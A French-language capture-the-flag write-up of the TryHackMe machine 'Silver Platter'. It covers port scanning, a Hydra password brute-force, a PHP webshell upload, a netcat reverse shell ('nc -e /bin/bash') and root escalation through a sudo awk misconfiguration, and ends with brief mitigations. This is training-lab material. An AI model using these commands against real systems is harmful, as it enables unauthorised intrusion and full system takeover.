# 🎩 Write Up : Silver Platter - TryHackMe 🍽️

## 📌 Informations

- **🖥️  Machine** : Silver Platter
- **🌍 Plateforme** : TryHackMe
- **⚡ Difficulté** : Facile/Intermédiaire
- **💻 Type** : 🕸️ Web Exploitation & 🏗️ Privilege Escalation

---

## 🏁 Objectifs 🎯

- 🔑 **Accès initial** : Trouver une 🔓 faille web pour obtenir un premier accès.
- 🏆 **Privilèges root** : Exploiter une 🔥 mauvaise configuration pour devenir root.
- 📜 **Récupération des flags** : `user.txt` & `root.txt`.

---

## 🔍 1️⃣ Scan et Reconnaissance

On commence par scanner les 📡 ports ouverts et les services disponibles.

### **📡 Scan Nmap**

```bash
nmap -sC -sV -T4 -p- <IP_de_la_machine>
```

🔎 **Résultat :**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  🛜 ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  🌐 http     nginx 1.14.0 (Ubuntu)
8080/tcp open  🌍 http     Apache httpd 2.4.29 ((Ubuntu))
```

- 🔐**Port 22** : Service SSH (peut être utile plus tard).
- 🕸️ **Port 80** : Site web en ligne.
- 🏗️ **Port 8080** : Serveur web Apache distinct.

---

## 🌐 2️⃣ Analyse des Services Web

### **🌍 Port 80 - Site Web Principal**

On explore le site et on lance `gobuster` pour trouver des 📂 fichiers cachés :

```bash
gobuster dir -u http://10.10.0.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

**Résultat :**

```
/images               (Status: 301)
/index.html           (Status: 200)
/assets               (Status: 301)
/README.txt           (Status: 200)
```

On récupère `README.txt` pour voir son contenu 📄 :

```bash
curl http://10.10.0.51/README.txt
```

📜 Rien de sensible mais il mentionne un projet **SilverPeas**.

### **🌍 Port 8080 - Application Web SilverPeas**

On trouve une 🔑 **page de connexion** `http://10.10.0.51:8080/silverpeas`.

En utilisant **📝 cewl**, on génère une wordlist spécifique 📄 :

```bash
cewl http://10.10.0.51 -w passwords.txt
```

Puis, bruteforce du login avec 🦍 **Hydra** :

```bash
hydra -l scr1ptkiddy -P passwords.txt 10.10.0.51 http-post-form "/silverpeas/login:username=^USER^&password=^PASS^:F=Invalid login"
```

✅ **Identifiants trouvés 🎉** : `scr1ptkiddy:adipiscing`

Je vous laisse naviguer sur le site web, il y a beaucoup d'informations qui retiennent notre attention.
Je vais vous montrer une méthode rapide d'injection et d'élévation de privilèges, cependant il y a un moyen bien plus intéressant et un peu plus long, lorsqu'on éxamine le site web et les notifications....
---

## 🔓 3️⃣ Exploitation & Accès Initial

### **📤 Upload de Webshell**

Dans l’application SilverPeas, nous pouvons **📤 téléverser des fichiers**. On tente un **WebShell 🐚 PHP** :

**📄 Contenu de `shell.php`** :

```php
<?php
system($_GET['cmd']);
?>
```

On l’envoie 📤, puis on y accède via :

```bash
http://10.10.0.51:8080/silverpeas/uploaded_files/shell.php?cmd=id
```

✅ **Shell obtenu 🎯** en tant que **`www-data`**

Pour obtenir un shell interactif 🖥️ :

```bash
nc -e /bin/bash <votre_ip> 8080
```

---

## 🔝 4️⃣ Escalade de Privilèges 🚀

### **🔎 Analyse des Permissions Sudo**

On vérifie les permissions sudo 🔍 :

```bash
sudo -l
```

🔎 **Résultat :**

```
User www-data may run the following commands on silverplatter:
    (ALL) NOPASSWD: /usr/bin/awk
```

### **💥 Exploitation via Awk**

On utilise `awk` pour exécuter un **shell root 👑** :

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

✅ **Nous sommes root 🎉 !**

---

## 🏆 5️⃣ Récupération des Flags 📜

```bash
cat /home/scr1ptkiddy/user.txt
cat /root/root.txt
```

✅ **Flags obtenus 🎊 !**

---

## 🔐 6️⃣ Protection contre ces Vulnérabilités 🔒

- 🚫 **Désactiver l’upload de fichiers arbitraires**.
- ❌ **Restreindre les permissions sudo inutiles** (`sudo -l`).
- 🔐 **Utiliser des identifiants complexes et limiter les tentatives de connexion**.

---

## 🎯 Conclusion 🏁

Cette machine nous a permis d’explorer plusieurs techniques 🛠️ :

- 🔎 **Reconnaissance et analyse web** via Gobuster et CEWL.
- 🕵️‍♂️ **Exploitation web** via upload de WebShell.
- 🚀 **Escalade de privilèges** en exploitant un mauvais paramétrage sudo.


---

✅ **TryHackMe - Silver Platter complété avec succès 🎉 !** 🚀

